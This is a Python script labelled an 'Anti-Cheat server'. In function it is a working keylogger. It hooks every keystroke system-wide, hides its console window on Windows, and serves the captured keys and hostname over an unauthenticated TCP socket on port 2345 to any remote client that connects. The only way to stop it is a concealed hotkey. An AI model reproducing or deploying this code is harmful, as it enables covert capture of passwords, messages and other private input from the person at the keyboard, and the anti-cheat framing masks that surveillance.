#!/usr/bin/env python

""" Anti-Cheat server :
    Get all the keys pressed by user and send them to the client
"""

import os
import sys
import time
import socket
import json

import keyboard
import win32gui


SENDING_KEYS_INTERVAL = 0.3 # seconds
STOP_HOTKEY = "ctrl+maj+q"

SERVER_HOST = "0.0.0.0"
SERVER_PORT = 2345
CHUNK_SIZE = 20

HOST_PSEUDO = ""


def on_key_press(key):
    """
     Called when a key is pressed. Stores information in the buffer for later use. This is a callback function for key_press events.
     
     Args:
     	 key: The key that was pressed. This is a reference to the : class : ` Key ` of the socket module
    """
    keys_buffer.append({"key" : key.name, "time" : key.time})


def send_keys(conn, addr):
    """
     Send the contents of the keys buffer to the client and clear it. This is used to send keystrokes that are generated by the client to the server
     
     Args:
     	 conn: The socket to send the data to
     	 addr: The address of the client that generated the data
     
    """
    global keys_buffer, isRunning, isHostConnected

    if not keys_buffer: return # if the user has not pressed any keys

    data = json.dumps({"hostname" : hostname, "keys" : keys_buffer})
    
    if len(data) < 1024: # if the data takes less than 1024 bytes, send it to the client in one shot
        try:
            conn.sendall(data.encode("utf-8"))
        except socket.error as e:
            print(f"Error sending keys (len(data) < 1024) {e}")
            isHostConnected = False
            return
    
    # if data is too big, send it to the client in chunks of 20 keys
    else:
        # send chunks of 20 keys
        for i in range(len(keys_buffer)//CHUNK_SIZE):
            data = json.dumps({"hostname" : hostname, "keys" : keys_buffer[i*CHUNK_SIZE:(i+1)*CHUNK_SIZE]})
            try:
                conn.sendall(data.encode("utf-8"))
            except socket.error as e:
                print(f"Error sending keys (len(data) > 1024) {e}")
                isHostConnected = False
                return
            time.sleep(0.1)
        # send the rest of the buffer to the client
        try:    
            conn.sendall(json.dumps({"hostname" : hostname, "keys" : keys_buffer[(i+1)*CHUNK_SIZE:]}).encode("utf-8"))
        except socket.error as e:
            print(f"Error sending keys (len(data) < 1024) (last chunk) {e}")
            isHostConnected = False
            return

    keys_buffer.clear()


def stop(hook_id):
    """
     Stop the server by hook id. This is a no - op if the server is not running.
     
     Args:
     	 hook_id: id of the hook to stop as
    """
    global isRunning

    isRunning = False
    keyboard.unhook(hook_id)


def hide_windows_console():
    """Hide the console of the programm (works only for Windows)."""
    if "TERM_PROGRAM" in os.environ.keys() and os.environ["TERM_PROGRAM"] == "vscode": return # to not close vs code window (https://stackoverflow.com/questions/71877225/detect-python-is-running-in-visual-studio-code)
    win32gui.ShowWindow(win32gui.GetForegroundWindow(), 0) 


def main():
    """
     Listen for and send keystrokes to the server. This is the main function of the program
    """
    global keys_buffer, isRunning, isHostConnected

    hook_id = keyboard.on_press(on_key_press)
    keyboard.add_hotkey(STOP_HOTKEY, stop, args=[hook_id], suppress=True) # stop the server when ctrl+maj+q is pressed (dont work if it is not already connected)

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:

        try:
            s.bind((SERVER_HOST, SERVER_PORT))
        except OSError as e:
            print(f"Error binding to {SERVER_HOST}:{SERVER_PORT} : {e}")
            input("Press enter to exit...")
            sys.exit()

        s.listen()
        # set timeout to 5s so if isRunning is False it wont block to wait for a connection
        s.settimeout(10)

        while isRunning:

            try:
                conn, addr = s.accept()
            except socket.timeout as e:
                # no one want to connect
                continue

            isHostConnected = True
            s.settimeout(None)

            while isHostConnected and isRunning:
                time.sleep(SENDING_KEYS_INTERVAL)
                send_keys(conn, addr)


if __name__ == "__main__":

    keys_buffer = []
    isRunning = True
    isHostConnected = False
    hostname = HOST_PSEUDO or socket.gethostname()

    hide_windows_console() if sys.platform == "win32" else None # hide
    main()